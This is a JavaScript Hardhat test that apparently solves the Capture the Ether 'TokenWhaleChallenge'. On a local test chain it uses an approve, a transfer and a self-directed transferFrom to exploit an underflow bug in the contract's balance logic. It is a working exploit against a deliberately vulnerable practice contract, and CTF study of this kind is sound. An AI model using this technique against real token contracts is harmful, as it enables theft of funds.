import { expect } from "chai";
import { ethers } from "hardhat";

describe("TokenWhaleChallenge", () => {
  it("Solves the challenge", async () => {
    // get two signers
    const accounts = await ethers.getSigners();
    const [player, friend] = accounts.slice(0, 2);

    // deploy contract
    const factory = await ethers.getContractFactory("TokenWhaleChallenge");
    const contract = await factory.deploy(player.address);
    await contract.waitForDeployment();

    // signed by friend, approve an amount from the friend account to the player account
    const approve = await contract
      .connect(friend)
      .approve(player.address, 1000);
    await approve.wait();

    // signed by player, transfer an amount from the player account to the friend account
    const transfer = await contract
      .connect(player)
      .transfer(friend.address, 501);
    await transfer.wait();

    // signed by player account, transfer an amount from the friend account to the friend account
    const overTransfer = await contract
      .connect(player)
      .transferFrom(friend.address, friend.address, 500);
    await overTransfer.wait();

    const balance1 = await contract.balanceOf(player.address);
    const balance2 = await contract.balanceOf(friend.address);

    console.log(
      "player balance:",
      balance1.toString(),
      "friend balance:",
      balance2.toString()
    );

    expect(await contract.isComplete()).to.be.true;
  });
});
